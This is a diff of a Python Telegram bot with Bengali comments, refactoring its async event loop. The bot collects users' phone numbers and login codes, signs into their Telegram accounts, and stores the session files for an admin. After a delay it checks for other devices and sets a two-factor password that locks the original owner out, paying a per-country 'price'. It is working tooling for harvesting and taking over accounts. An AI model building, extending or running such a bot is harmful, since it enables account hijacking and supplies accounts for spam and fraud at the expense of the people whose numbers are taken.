@@ -88,8 +88,7 @@ def get_current_file_count(country_code):
     target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
     if not os.path.exists(target_dir): return 0
     try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
-    except: pass
-    return 0
+    except: return 0
 
 # ==================== UPTIME WEB SERVER ====================
 @app.route('/')
@@ -113,10 +112,13 @@ def run_web():
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
 
-Thread(target=run_web, daemon=True).start()
+# অ্যাসিনক্রোনাস কাজের জন্য গ্লোবাল ইভেন্ট লুপ তৈরি
+bot_loop = asyncio.new_event_loop()
+def start_async_loop(loop):
+    asyncio.set_event_loop(loop)
+    loop.run_forever()
 
-loop = asyncio.new_event_loop()
-asyncio.set_event_loop(loop)
+Thread(target=start_async_loop, args=(bot_loop,), daemon=True).start()
 
 def check_valid_country_and_get_code(phone_number):
     clean = phone_number.replace("+", "").replace(" ", "")
@@ -139,7 +141,7 @@ def process_start(message):
 def process_cancel(message):
     user_id = message.from_user.id
     if user_id in user_data:
-        try: loop.run_until_complete(user_data[user_id]["client"].disconnect())
+        try: asyncio.run_coroutine_threadsafe(user_data[user_id]["client"].disconnect(), bot_loop)
         except: pass
         del user_data[user_id]
     bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")
@@ -259,7 +261,6 @@ def handle_text(message):
     text = message.text.strip()
     low_text = text.lower()
 
-    # ১. এডমিন স্টেট হ্যান্ডলিং
     if user_id == ADMIN_ID and user_id in admin_state:
         state = admin_state[user_id]
         settings = load_settings()
@@ -285,18 +286,17 @@ def handle_text(message):
             bot.reply_to(message, f"❌ Format Error: {str(e)}")
         return
 
-    # ২. ইউজার মেনু বাটন হ্যান্ডলিং
     if "start" in low_text or "/start" in low_text: process_start(message); return
     elif "cancel" in low_text or "/cancel" in low_text: process_cancel(message); return
     elif "capacity" in low_text or "/capacity" in low_text: process_capacity(message); return
     elif "account" in low_text or "/account" in low_text: process_account(message); return
 
-    # 🔥 [ফিক্স] ৩. ওটিপি কোড হ্যান্ডলিং (এটি ফোন নম্বর চেকিং এর উপরে থাকবে যাতে কোড নম্বর হিসেবে ডিটেক্ট না হয়)
+    # ওটিপি কোড হ্যান্ডলিং
     if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
-        loop.run_until_complete(verify_otp_task(text, user_id, message))
+        asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
         return
 
-    # ৪. নম্বর ইনপুট ও কান্ট্রি ওপেন/ক্লোজ ভ্যালিডেশন ফিল্টার
+    # নম্বর ইনপুট ও কান্ট্রি ফিল্টার
     if text.startswith("+") or text.isdigit():
         phone = text if text.startswith("+") else f"+{text}"
         matched_country_code = check_valid_country_and_get_code(phone)
@@ -305,13 +305,12 @@ def handle_text(message):
             bot.reply_to(message, "❗you cannot at account from country.")
             return
             
-        # স্ক্রিনশট ১ এর মতো হুবহু রেসপন্স
         processing_msg = bot.reply_to(message, "🔄 Processing please wait...")
-        loop.run_until_complete(send_otp_task(phone, matched_country_code, user_id, message, processing_msg))
+        asyncio.run_coroutine_threadsafe(send_otp_task(phone, matched_country_code, user_id, message, processing_msg), bot_loop)
     else:
         bot.reply_to(message, "❌ Invalid Command or Phone Number format. Use /start to reset.")
 
-# ==================== ওটিپی ও সেশন কোর ব্যাকএন্ড ====================
+# ==================== ওটিপি ও সেশন কোর ব্যাকএন্ড (রানিং ইন বোতল লুপ) ====================
 async def send_otp_task(phone_number, country_code, user_id, message, processing_msg):
     settings = load_settings()
     max_capacity = settings["country_capacity"].get(country_code, 9999)
@@ -337,7 +336,6 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
             "clean_phone": clean_phone, "session_path": final_session_path, "country_code": country_code
         }
         
-        # স্ক্রিনশট ১ এর মতো ওটিপি চাওয়ার ইন্টারফেস
         otp_prompt = (
             "🔢 Enter the code sent to the number or send the message.\n\n"
             f"🇨🇴 ( `{phone_number}` )\n\n"
@@ -373,10 +371,9 @@ async def verify_otp_task(text, user_id, message):
 async def process_security_and_backup(user_id, message, data, current_client):
     settings = load_settings()
     country_delays = settings.get("country_delays", {})
-    delay = country_delays.get(data['country_code'], 600) # স্ক্রিনশটের মতো ডিফল্ট ৬০০ সেকেন্ড
-    price = settings["country_prices"].get(data['country_code'], 0.24) # ডিফল্ট ০.২৪ বা সেট করা প্রাইস
+    delay = country_delays.get(data['country_code'], 600)
+    price = settings["country_prices"].get(data['country_code'], 0.24)
     
-    # স্ক্রিনশট ২ এর মতো হুবহু সাকসেস ফরম্যাট রেডি করা
     success_text = (
         f"✅ The account number `{data['phone']}` was successfully received\n\n"
         f"❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n"
@@ -384,23 +381,18 @@ async def process_security_and_backup(user_id, message, data, current_client):
         f"🏷️ Spam Status : 🕊️ Free As Bird"
     )
     
-    # নিচের প্রাইস বাটনটি তৈরি করা
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data="none"))
+    bot.reply_to(message, success_text, reply_markup=markup)
     
-    status_msg = bot.reply_to(message, success_text, reply_markup=markup)
-    
-    # ব্যাকগ্রাউন্ডে ৬০০ সেকেন্ড কাউন্টডাউন এবং আদার ডিভাইস চেক রান করা
     await asyncio.sleep(delay)
     try:
         auths = await current_client(functions.account.GetAuthorizationsRequest())
-        # যদি অন্য সেশন একটিভ থাকে
         if len([a for a in auths.authorizations if not a.current]) > 0:
             bot.send_message(message.chat.id, f"❌ **Verification Failed!** Other active devices detected on `{data['phone']}`.")
             await current_client.disconnect()
             return False
             
-        # ২এফএ লক সেট করা
         try:
             await current_client(functions.account.UpdatePasswordSettingsRequest(
                 password=tl_types.InputCheckPasswordEmpty(),
@@ -413,3 +405,9 @@ async def process_security_and_backup(user_id, message, data, current_client):
         bot.send_message(ADMIN_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
     except Exception as e:
         pass
+
+if __name__ == "__main__":
+    # Flask সার্ভার ব্যাকগ্রাউন্ড থ্রেডে স্টার্ট করা (Render-এর জন্য পোর্ট ৮MD ওপেন রাখা)
+    Thread(target=run_web, daemon=True).start()
+    # টেলিগ্রাম পোলিং স্টার্ট করা মেইন থ্রেডে
+    bot.infinity_polling(skip_pending=True)
